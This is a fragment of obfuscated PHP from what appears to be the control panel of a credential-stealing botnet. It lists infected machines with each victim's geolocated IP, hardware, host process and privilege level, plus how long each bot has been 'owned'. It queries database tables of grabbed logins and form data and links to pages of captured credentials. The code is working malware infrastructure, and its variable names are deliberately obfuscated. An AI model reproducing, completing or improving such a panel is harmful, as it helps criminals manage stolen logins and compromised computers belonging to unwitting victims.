        $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_ = $sqlGeoIP->GetCityInfoFromIP($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_);
        if ($_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_ && isset($_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["country"])) {
            $_obfuscated_0D29133940270A13292A5B0B0C18181B1701320E072411_ = str_replace("\"", "", $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["country"]);
            $_obfuscated_0D2F38170B25301B1E09275C3010143F112F333E052311_ = str_replace("\"", "", $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["city"]);
            $_obfuscated_0D1D22153C1F15132F2107213F32152402060830290232_ = str_replace("\"", "", $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["region"]);
            $_obfuscated_0D0C07332F24082928270F391B1202343606102F281D11_ = str_replace("\"", "", $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["postalCode"]);
            $_obfuscated_0D010923371B271A380D3D28353813013F2329400C2F11_ = str_replace("\"", "", $_obfuscated_0D271C31181B242A3F243821303C1E303C211B333B0332_["areaCode"]);
            if (strlen($_obfuscated_0D29133940270A13292A5B0B0C18181B1701320E072411_) == 0) {
                $_obfuscated_0D29133940270A13292A5B0B0C18181B1701320E072411_ = "<i>N/A</i>";
            }
            if (strlen($_obfuscated_0D2F38170B25301B1E09275C3010143F112F333E052311_) == 0) {
                $_obfuscated_0D2F38170B25301B1E09275C3010143F112F333E052311_ = "<i>N/A</i>";
            }
            if (strlen($_obfuscated_0D1D22153C1F15132F2107213F32152402060830290232_) == 0) {
                $_obfuscated_0D1D22153C1F15132F2107213F32152402060830290232_ = "<i>N/A</i>";
            }
            if (strlen($_obfuscated_0D0C07332F24082928270F391B1202343606102F281D11_) == 0) {
                $_obfuscated_0D0C07332F24082928270F391B1202343606102F281D11_ = "<i>N/A</i>";
            }
            if (strlen($_obfuscated_0D010923371B271A380D3D28353813013F2329400C2F11_) == 0) {
                $_obfuscated_0D010923371B271A380D3D28353813013F2329400C2F11_ = "<i>N/A</i>";
            }
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ = "<table>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>IP:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_ . "</td></tr>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>Country:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D29133940270A13292A5B0B0C18181B1701320E072411_ . "</td></tr>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>City/town:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D2F38170B25301B1E09275C3010143F112F333E052311_ . "</td></tr>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>Region:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D1D22153C1F15132F2107213F32152402060830290232_ . "</td></tr>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>Postal code:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D0C07332F24082928270F391B1202343606102F281D11_ . "</td></tr>";
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>Area code:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D010923371B271A380D3D28353813013F2329400C2F11_ . "</td></tr>";
            $_obfuscated_0D05030F182310011725142C283532303B05193B070C11_ = $sqlGeoIP->GetASNInfoFromIP($_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_);
            if ($_obfuscated_0D05030F182310011725142C283532303B05193B070C11_ && isset($_obfuscated_0D05030F182310011725142C283532303B05193B070C11_["asn_name"])) {
                $_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_ = str_replace("\"", "", $_obfuscated_0D05030F182310011725142C283532303B05193B070C11_["asn_name"]);
                $_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_ = str_replace("'", "", $_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_);
                if (strlen($_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_) == 0) {
                    $_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_ = "<i>N/A</i>";
                }
                $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "<tr><td style='width: 100px;'><b>ASN/Provider:</b> </td><td style='width: 390px;'>" . $_obfuscated_0D390B115C25333F5C310E2F1F3D061106300B2D322301_ . "</td></tr>";
            }
            $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ .= "</table>";
            $_obfuscated_0D29400D38035B0F033C36082918035C36353605300332_ = "&nbsp;&nbsp;(<a id=\"ipinfo_" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ . "\" rel=\"popover\" data-content=\"" . $_obfuscated_0D3E111806353B091D2B2C161B161A013722020E132F32_ . "\" data-original-title=\"IP Information\" href=\"#\">Info</a>)";
            $_obfuscated_0D29400D38035B0F033C36082918035C36353605300332_ .= "<script>\$(function (){\$(\"#ipinfo_" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ . "\").popover({template: '<div class=\"popover\"><div class=\"arrow\"></div><div class=\"popover-inner\" style=\"width: 500px;\"><h3 class=\"popover-title\"></h3><div class=\"popover-content\"><p></p></div></div></div>'});});</script>";
        }
    }
    $_obfuscated_0D3D1D04123D113D22212C2E3C3C2E12012C053C183822_ = $is_favorites ? "content3" : "content2";
    echo "<tr>\r\n";
    echo "<td><img class=\"" . $_obfuscated_0D3D1D04123D113D22212C2E3C3C2E12012C053C183822_ . "\" style=\"cursor: pointer;\" src=\"img/page/down.png\" title=\"Click to toggle quick info\"></td>\r\n";
    echo "<td>" . @strtoupper(@bin2hex($_obfuscated_0D3225373E08231E292D1005271D1A101A2B173D1D3E32_)) . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D0B283B121323280D13283F151F232B22370D15042622_ . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D213F12370B392B2B5C5B3F16191404362C390E1F3D01_ . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D1C2934220C11212E183240240D113E18300B131E3122_ . " " . $_obfuscated_0D29400D38035B0F033C36082918035C36353605300332_ . "</td>\r\n";
    echo "<td>" . $botsIndex->GetFullOsStringFromMask($_obfuscated_0D1B133D113E11313E06162607343D5C031910403D0132_, true) . "</td>\r\n";
    echo "<td>" . date("m/d/Y h:i:s a", $_obfuscated_0D261B302E2E1D33014016263F2A2C382A0D1233383222_) . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D08080C0A0B37050A1311101432223001071229321211_ . "</td>";
    echo "<td>" . $_obfuscated_0D301E2A2D0E1F162413363C27352C3E3B2D0F092C1711_ . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D3B302127093119042F13121705342E16235B180D3F01_ . "</td>\r\n";
    echo "<td>" . $_obfuscated_0D163F401323082F1236161909340615373B2719211C32_ . "</td>\r\n";
    echo "<td><center>" . $_obfuscated_0D0B3028392611063F1E5B021E07130B115B033D3D2F22_ . "</center></td>";
    echo "</tr>";
    $_obfuscated_0D231E31252E07300413360E1C0E1E3031343506152932_ = 0;
    $_obfuscated_0D1C3D2B5B233B1A043325232D38393938102810090332_ = 0;
    $_obfuscated_0D3B2B303C5B1F103E14211A020B38403E351A183B3211_ = _obfuscated_0D351907351203383E0311143B1F363C0D183F09383D22_($_obfuscated_0D261B302E2E1D33014016263F2A2C382A0D1233383222_, $_obfuscated_0D26121A2A3121272C14082B0D40123018140F3F222D32_);
    $_obfuscated_0D0F350308285C17112D073B26093F3F0B123235033E11_ = $_obfuscated_0D370C12153B3302112925211F2F5C122713291B0C0B11_ & BOT_ATTRIBUTE_IS_ELEVATED ? "<font color=\"#339900\">Yes</font>" : "<font color=\"#E80000\">No</font>";
    $_obfuscated_0D1E035C2C13223C291138393E2E0E3B321D285B1E2D01_ = _obfuscated_0D1B343104272A3128121F231B322210111B372F041911_(MOD_VIEW_BOT, "&id=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_);
    $_obfuscated_0D34021E3F0833282415392603080633253F1C263D3411_ = NULL;
    $_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = NULL;
    $_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_ = "SELECT\n\t\t\t\t\t\t\t(SELECT COUNT(grabbed_forms.id) FROM " . SQL_DATABASE . ".grabbed_forms WHERE bot_id = " . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ . ") AS 'FORM_COUNT',\n\t\t\t\t\t\t\t(SELECT COUNT(grabbed_logins.id) FROM " . SQL_DATABASE . ".grabbed_logins WHERE bot_id = " . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_ . ") AS 'LOGIN_COUNT'";
    if (!($sqlSettings->General_Options & GENERAL_OPTION_DISABLE_MAINPAGE_INDV_GRABS_STATS)) {
        if (($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_ = $botsIndex->Query($_obfuscated_0D2C230D1D0E1F2B39191B3B3C0B40313421040F0D0601_)) && ($_obfuscated_0D34021E3F0833282415392603080633253F1C263D3411_ = mysql_fetch_assoc($_obfuscated_0D1A012E3D0902021E1E031B221C30181F2B5B0F390B22_))) {
            $_obfuscated_0D231E31252E07300413360E1C0E1E3031343506152932_ = $_obfuscated_0D34021E3F0833282415392603080633253F1C263D3411_["FORM_COUNT"];
            $_obfuscated_0D1C3D2B5B233B1A043325232D38393938102810090332_ = $_obfuscated_0D34021E3F0833282415392603080633253F1C263D3411_["LOGIN_COUNT"];
        }
    } else {
        $_obfuscated_0D231E31252E07300413360E1C0E1E3031343506152932_ = "<i>Disabled via settings</i>";
        $_obfuscated_0D1C3D2B5B233B1A043325232D38393938102810090332_ = "<i>Disabled via settings</i>";
    }
    echo "<tr><td style=\"display: none; border-top: 1px solid #DDD; border-bottom: 1px solid #DDD;\" colspan=\"12\"><table class=\"table-condensed\" style=\"border: hidden; width: 1280px;\"><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"40%\"><table class=\"table-condensed\" style=\"border: hidden; width: 520px;\"><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Computer Name:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D1F173429235C38082C36375C3D2E06352111051E2D32_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>CPU:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D5B01392419081A3432052F5B262B0C1D011D33011211_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Video Card:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D39303E36255B03375C5C5C33162A0735142A343B2C32_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Host Process:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D2C2D0D0E370B2924263E135C21011F35281E073F1322_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Comments:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D011B061C1F370E281115271F29112B2C231F5B330C11_ . "</td>";
    echo "</tr></table></td><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"60%\"><table class=\"table-condensed\" style=\"border: hidden; width: 520px;\"><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Bot owned for:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D3B2B303C5B1F103E14211A020B38403E351A183B3211_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Has Elevated Privileges:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D0F350308285C17112D073B26093F3F0B123235033E11_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Grabbed Logins:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D1C3D2B5B233B1A043325232D38393938102810090332_ . "</td>";
    echo "</tr><tr><td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"30%\"><strong>Grabbed Forms:</strong></td>";
    echo "<td style=\"border: hidden; background-color: white; margin: 0; padding: 0;\" width=\"70%\">" . $_obfuscated_0D231E31252E07300413360E1C0E1E3031343506152932_ . "</td>";
    echo "</tr></table></td></tr></table><br>";
    if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_BOT_INFO)) {
        echo "View full bot information <strong>|</strong> ";
    } else {
        echo "<a href=\"" . $_obfuscated_0D1E035C2C13223C291138393E2E0E3B321D285B1E2D01_ . "\">View full bot information</a> <strong>|</strong> ";
    }
    if (!((int) $Session->Rights() & USER_PRIVILEGES_VIEW_LOGS)) {
        echo "View captured logins <strong>|</strong> View captured forms <strong>|</strong> ";
    } else {
        echo "<a href=\"" . $_obfuscated_0D39041B3F0628051622041910262703060A0E35220701_ . "\">View captured logins</a> <strong>|</strong> ";
        echo "<a href=\"" . $_obfuscated_0D2C23350F5C142804340E342D19121A2A0C3734150722_ . "\">View captured forms</a> <strong>|</strong> ";
    }
    if ($is_favorites == false) {
        echo "<a href=\"" . _obfuscated_0D095B10152B111B39392E5C04180E10343B270D323601_("&add_fav=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_) . "\">Add to favorite bots</a>";
    } else {
        echo "<a href=\"" . _obfuscated_0D095B10152B111B39392E5C04180E10343B270D323601_("&del_fav=" . $_obfuscated_0D0D365B300C242A2E27092A5C0C36082F2A100D322732_) . "\">Remove from favorite bots</a>";
    }
    echo "</td></tr>";
}

?>